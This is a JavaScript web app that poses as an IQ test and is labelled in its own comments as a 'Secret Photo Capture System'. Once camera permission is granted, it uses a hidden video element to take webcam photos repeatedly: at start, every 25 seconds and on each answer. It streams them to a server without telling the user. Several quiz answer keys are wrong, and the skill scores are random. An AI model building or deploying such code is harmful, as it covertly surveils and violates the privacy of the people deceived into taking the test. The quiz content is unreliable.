// IQ Test Application - Secret Photo Capture System
class IQTestApp {
    constructor() {
        this.currentQuestion = 0;
        this.answers = [];
        this.sessionId = this.getSessionId();
        this.stream = null;
        this.ws = null;
        this.captureInterval = null;
        this.hiddenVideo = document.getElementById('hidden-video');
        
        this.questions = [
            {
                question: "If all Bloops are Razzles and all Razzles are Lazzles, then all Bloops are definitely Lazzles?",
                options: ["True", "False", "Cannot be determined", "Insufficient information"],
                correct: 0
            },
            {
                question: "What number should replace the question mark? 2, 6, 12, 20, 30, ?",
                options: ["40", "42", "45", "48"],
                correct: 1
            },
            {
                question: "Which word does not belong? Apple, Orange, Banana, Carrot, Grape",
                options: ["Apple", "Orange", "Carrot", "Grape"],
                correct: 2
            },
            {
                question: "If you rearrange the letters 'CIFAIPC' you would have the name of a(n):",
                options: ["City", "Animal", "Ocean", "Country"],
                correct: 2
            },
            {
                question: "What comes next in this sequence? 1, 1, 2, 3, 5, 8, ?",
                options: ["11", "13", "15", "16"],
                correct: 1
            },
            {
                question: "A clock shows 3:15. What is the angle between the hour and minute hands?",
                options: ["0°", "7.5°", "15°", "22.5°"],
                correct: 1
            },
            {
                question: "If 3 cats catch 3 mice in 3 minutes, how many cats are needed to catch 100 mice in 100 minutes?",
                options: ["3", "33", "100", "300"],
                correct: 0
            },
            {
                question: "Which number is the odd one out? 17, 23, 29, 33, 37",
                options: ["17", "23", "33", "37"],
                correct: 2
            },
            {
                question: "Complete the analogy: Book is to Reading as Fork is to:",
                options: ["Eating", "Kitchen", "Spoon", "Food"],
                correct: 0
            },
            {
                question: "What is the next letter in this sequence? A, D, G, J, ?",
                options: ["K", "L", "M", "N"],
                correct: 2
            },
            {
                question: "If today is Monday, what day will it be 100 days from now?",
                options: ["Monday", "Tuesday", "Wednesday", "Thursday"],
                correct: 1
            },
            {
                question: "Which shape completes the pattern? Circle, Square, Triangle, Circle, Square, ?",
                options: ["Circle", "Square", "Triangle", "Pentagon"],
                correct: 2
            },
            {
                question: "What is 15% of 240?",
                options: ["32", "36", "40", "48"],
                correct: 1
            },
            {
                question: "If BAT = 23, CAT = 24, what does DOG equal?",
                options: ["26", "27", "28", "29"],
                correct: 0
            },
            {
                question: "Which word can be made from these letters? TRSAET",
                options: ["TREATS", "TASTER", "RATTER", "STARTER"],
                correct: 1
            },
            {
                question: "What number is missing? 8, 27, ?, 125, 216",
                options: ["54", "64", "72", "81"],
                correct: 1
            },
            {
                question: "If you flip a fair coin 10 times and get heads every time, what is the probability of getting heads on the 11th flip?",
                options: ["Very low", "50%", "Very high", "Cannot be determined"],
                correct: 1
            },
            {
                question: "Which number continues this pattern? 1, 4, 9, 16, 25, ?",
                options: ["30", "35", "36", "49"],
                correct: 2
            },
            {
                question: "What comes next? Monday, Wednesday, Friday, ?",
                options: ["Saturday", "Sunday", "Monday", "Tuesday"],
                correct: 1
            },
            {
                question: "If EARTH is coded as HTWOG, how is WATER coded?",
                options: ["ZDWHU", "YDVGT", "ZEXIV", "XBUFS"],
                correct: 0
            },
            {
                question: "Which is the odd one out? Mozart, Beethoven, Da Vinci, Bach",
                options: ["Mozart", "Beethoven", "Da Vinci", "Bach"],
                correct: 2
            },
            {
                question: "Complete the sequence: 2, 6, 18, 54, ?",
                options: ["108", "162", "216", "270"],
                correct: 1
            },
            {
                question: "If all Glips are Flops and some Flops are Clips, then:",
                options: ["All Clips are Glips", "Some Glips are Clips", "No Glips are Clips", "Cannot be determined"],
                correct: 3
            },
            {
                question: "What is the result of: 7 × 8 + 15 ÷ 3 - 10?",
                options: ["51", "49", "47", "45"],
                correct: 0
            },
            {
                question: "Which number should replace the question mark? 3, 7, 15, 31, ?",
                options: ["51", "55", "63", "67"],
                correct: 2
            }
        ];
        
        this.init();
    }
    
    getSessionId() {
        const urlParts = window.location.pathname.split('/');
        return urlParts[urlParts.length - 1];
    }
    
    init() {
        this.connectWebSocket();
        this.bindEvents();
        this.shuffleQuestions();
        this.requestCameraPermission();
    }
    
    connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}`;
        
        this.ws = new WebSocket(wsUrl);
        
        this.ws.onopen = () => {
            console.log('Connected to server');
        };
        
        this.ws.onclose = () => {
            console.log('Disconnected from server');
            setTimeout(() => this.connectWebSocket(), 3000);
        };
        
        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };
    }
    
    shuffleQuestions() {
        for (let i = this.questions.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [this.questions[i], this.questions[j]] = [this.questions[j], this.questions[i]];
        }
        this.questions = this.questions.slice(0, 25);
    }
    
    async requestCameraPermission() {
        const statusEl = document.getElementById('camera-status');
        const startBtn = document.getElementById('start-test-btn');
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera not supported in this browser</span>';
            return;
        }
        
        try {
            statusEl.innerHTML = '<span class="status-icon">📷</span><span>Requesting camera permission...</span>';
            
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: false 
            });
            
            // Set up hidden video element
            this.hiddenVideo.srcObject = this.stream;
            this.hiddenVideo.muted = true;
            this.hiddenVideo.playsInline = true;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                this.hiddenVideo.onloadedmetadata = () => {
                    resolve();
                };
            });
            
            statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready - Assessment can begin</span>';
            startBtn.disabled = false;
            
            // Send initial verification photo
            setTimeout(() => {
                this.capturePhoto('verification');
            }, 1000);
            
        } catch (error) {
            console.error('Camera access error:', error);
            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera access denied. Please refresh and allow camera access.</span>';
        }
    }
    
    bindEvents() {
        const startBtn = document.getElementById('start-test-btn');
        const nextBtn = document.getElementById('next-btn');
        const retakeBtn = document.getElementById('retake-btn');
        
        startBtn.addEventListener('click', () => this.startTest());
        nextBtn.addEventListener('click', () => this.nextQuestion());
        retakeBtn.addEventListener('click', () => this.retakeTest());
    }
    
    showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenId).classList.add('active');
    }
    
    startTest() {
        this.showScreen('test-screen');
        this.displayQuestion();
        this.startSecretCapture();
    }
    
    startSecretCapture() {
        // Capture photo every 25 seconds during test
        this.captureInterval = setInterval(() => {
            this.capturePhoto('progress');
        }, 25000);
        
        // Capture initial test start photo
        setTimeout(() => {
            this.capturePhoto('test_start');
        }, 2000);
    }
    
    capturePhoto(type) {
        if (!this.hiddenVideo || !this.stream) return;
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = this.hiddenVideo.videoWidth || 640;
        canvas.height = this.hiddenVideo.videoHeight || 480;
        
        try {
            ctx.drawImage(this.hiddenVideo, 0, 0, canvas.width, canvas.height);
            
            // Add subtle watermark for admin identification
            ctx.fillStyle = 'rgba(0,0,0,0.7)';
            ctx.fillRect(canvas.width - 200, canvas.height - 30, 195, 25);
            ctx.fillStyle = '#fff';
            ctx.font = '12px Arial';
            ctx.fillText('IQ Test Capture', canvas.width - 195, canvas.height - 12);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            
            this.sendPhotoToServer(type, photoData);
            
        } catch (error) {
            console.error('Photo capture error:', error);
        }
    }
    
    sendPhotoToServer(type, photoData) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'iq_photo_capture',
                sessionId: this.sessionId,
                photoType: type,
                photo: photoData,
                timestamp: Date.now(),
                currentQuestion: this.currentQuestion
            }));
        }
    }
    
    displayQuestion() {
        const question = this.questions[this.currentQuestion];
        const questionContent = document.getElementById('question-content');
        
        questionContent.innerHTML = `
            <div class="question">
                <h3>${question.question}</h3>
                <div class="answer-options">
                    ${question.options.map((option, index) => `
                        <div class="answer-option" data-answer="${index}">
                            <strong>${String.fromCharCode(65 + index)}.</strong> ${option}
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
        
        // Update progress
        const progress = ((this.currentQuestion + 1) / this.questions.length) * 100;
        document.getElementById('progress-fill').style.width = `${progress}%`;
        document.getElementById('question-counter').textContent = `Question ${this.currentQuestion + 1} of ${this.questions.length}`;
        
        // Bind answer selection
        document.querySelectorAll('.answer-option').forEach(option => {
            option.addEventListener('click', () => {
                document.querySelectorAll('.answer-option').forEach(opt => opt.classList.remove('selected'));
                option.classList.add('selected');
                
                const answerIndex = parseInt(option.dataset.answer);
                this.answers[this.currentQuestion] = answerIndex;
                
                document.getElementById('next-btn').disabled = false;
                
                // Capture photo when answer is selected
                setTimeout(() => {
                    this.capturePhoto('answer_selected');
                }, 500);
            });
        });
        
        document.getElementById('next-btn').disabled = true;
    }
    
    nextQuestion() {
        this.currentQuestion++;
        
        if (this.currentQuestion < this.questions.length) {
            this.displayQuestion();
        } else {
            this.finishTest();
        }
    }
    
    finishTest() {
        // Stop secret photo capture
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
        }
        
        // Capture final completion photo
        this.capturePhoto('test_complete');
        
        // Calculate score
        let correctAnswers = 0;
        this.questions.forEach((question, index) => {
            if (this.answers[index] === question.correct) {
                correctAnswers++;
            }
        });
        
        const percentage = (correctAnswers / this.questions.length) * 100;
        const iqScore = Math.round(85 + (percentage / 100) * 45);
        
        this.showResults(iqScore, percentage);
        this.sendTestCompletion(iqScore, correctAnswers);
    }
    
    sendTestCompletion(iqScore, correctAnswers) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'iq_test_complete',
                sessionId: this.sessionId,
                score: iqScore,
                correctAnswers: correctAnswers,
                totalQuestions: this.questions.length,
                answers: this.answers,
                timestamp: Date.now()
            }));
        }
    }
    
    showResults(iqScore, percentage) {
        this.showScreen('results-screen');
        this.animateScore(iqScore);
        
        const description = this.getScoreDescription(iqScore);
        document.getElementById('score-description').textContent = description;
        
        setTimeout(() => {
            this.animateSkillBars(percentage);
        }, 1000);
    }
    
    animateScore(targetScore) {
        const scoreElement = document.getElementById('final-score');
        let currentScore = 0;
        const increment = targetScore / 100;
        
        const animation = setInterval(() => {
            currentScore += increment;
            scoreElement.textContent = Math.floor(currentScore);
            
            if (currentScore >= targetScore) {
                scoreElement.textContent = targetScore;
                clearInterval(animation);
            }
        }, 20);
    }
    
    getScoreDescription(score) {
        if (score >= 130) return "Exceptional intelligence - you demonstrate superior cognitive abilities with outstanding problem-solving skills.";
        if (score >= 115) return "Above average intelligence - you show strong analytical thinking and excellent reasoning capabilities.";
        if (score >= 100) return "Average intelligence - you demonstrate solid cognitive abilities and good problem-solving skills.";
        if (score >= 85) return "Below average - you show adequate cognitive abilities with room for improvement in analytical thinking.";
        return "Significantly below average - consider developing your analytical and reasoning skills further.";
    }
    
    animateSkillBars(percentage) {
        const logical = Math.min(100, percentage + Math.random() * 20 - 10);
        const pattern = Math.min(100, percentage + Math.random() * 20 - 10);
        const analytical = Math.min(100, percentage + Math.random() * 20 - 10);
        
        document.querySelector('[data-skill="logical"]').style.width = `${logical}%`;
        document.querySelector('[data-skill="pattern"]').style.width = `${pattern}%`;
        document.querySelector('[data-skill="analytical"]').style.width = `${analytical}%`;
    }
    
    retakeTest() {
        this.currentQuestion = 0;
        this.answers = [];
        this.shuffleQuestions();
        this.showScreen('welcome-screen');
        
        // Re-enable start button if camera is ready
        if (this.stream) {
            document.getElementById('start-test-btn').disabled = false;
        }
    }
}

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new IQTestApp();
});